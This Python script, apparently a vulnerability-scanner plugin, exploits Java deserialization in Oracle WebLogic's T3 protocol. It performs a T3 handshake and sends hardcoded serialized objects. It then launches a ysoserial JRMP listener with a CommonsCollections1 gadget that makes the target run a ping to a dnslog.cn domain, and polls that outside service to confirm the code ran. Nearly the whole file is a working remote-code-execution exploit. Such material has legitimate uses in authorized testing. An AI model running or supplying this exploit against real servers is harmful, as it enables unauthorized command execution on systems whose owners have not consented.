from __future__ import print_function
import os
import re
import signal
import time

import requests
import random
import socket
import subprocess
import threading

session = requests.Session()


def getdomain():
    try:
        ret = session.get("http://dnslog.cn/getdomain.php/?t=" + str(random.randint(100000, 999999)), timeout=10).text
    except Exception as e:
        print("get domain error:" + str(e))
        ret = "error"
        pass
    return ret


def getrecords():
    try:
        ret = session.get("http://dnslog.cn/getrecords.php/?t=" + str(random.randint(100000, 999999)), timeout=10).text
    except Exception as e:
        print("get record error:" + str(e))
        ret = "error"
        pass
    return ret

def getdnshost():
    reverhost = ""
    try:
        domain = getdomain()
        if domain == "error":
            print("get domain error")
        else:
            reverhost = domain
    except:
        pass
    return reverhost


def start_JRMP(port, domain):
    popen = subprocess.Popen(
        ['java', '-cp', 'ysoserial.jar', 'ysoserial.exploit.JRMPListener',f'{port}', 'CommonsCollections1',
         f'ping {domain}'], stdout=subprocess.PIPE)
    global pid
    pid = popen.pid


def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    try:
        popen = subprocess.Popen(
            ['java', '-jar', f'{path_ysoserial}', f'{jrmp_client}', f'{jrmp_listener_ip}:{jrmp_listener_port}'],
            stdout=subprocess.PIPE)
        data = popen.stdout.read().hex().upper()

    except:
        pass
    return data

def t3_handshake(sock, server_addr):
    try:
        sock.connect(server_addr)
        sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(1)
        sock.recv(1024)
    except:
        pass



def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
        '{:04x}'.format(port))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(bytes.fromhex(d))

def send_payload_objdata(sock,data):
    payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload += data
    payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s' % ('{:08x}'.format(len(payload) // 2 + 4), payload)
    sock.send(bytes.fromhex(payload))
    time.sleep(2)
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res

def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(20)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print("payload: " + payload)
    rs=send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')

def get_host():
    try:
        s= socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        host_ip=s.getsockname()[0]
    finally:
        s.close()
    return host_ip

def check(url, proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        domain = getdnshost()
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        if domain:
            print(domain)
            listen_port = '3579'
            t = threading.Thread(target=start_JRMP, args=(listen_port, domain,))
            t.start()
            time.sleep(2)
            dip=re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b",url)[0]
            dport=re.findall(f'{dip}:(\d+)',url)[0]
            dport=int(dport)
            jrmp_listener_ip=get_host()
            jrmp_listener_port=listen_port
            jrmp_client="JRMPClient"
            exploit(dip,dport,"./ysoserial.jar",jrmp_listener_ip,jrmp_listener_port,jrmp_client)
            time.sleep(2)
            try:
                os.kill(pid,signal.SIGKILL)
                pass
            except:
                os.system('taskkill /f /pid %s' % pid)
            t.join()
            time.sleep(2)
            for i in range(1,5):
                time.sleep(2)
                temp=getrecords()
                if domain in temp:
                    ret['success']=True
                    break
        else:
            print("get dns host error")
    except ZeroDivisionError as e:
        ret['error'] = e
        pass
    return ret

def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url,proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://192.168.160.201:7007/",
    }
    print(main(params))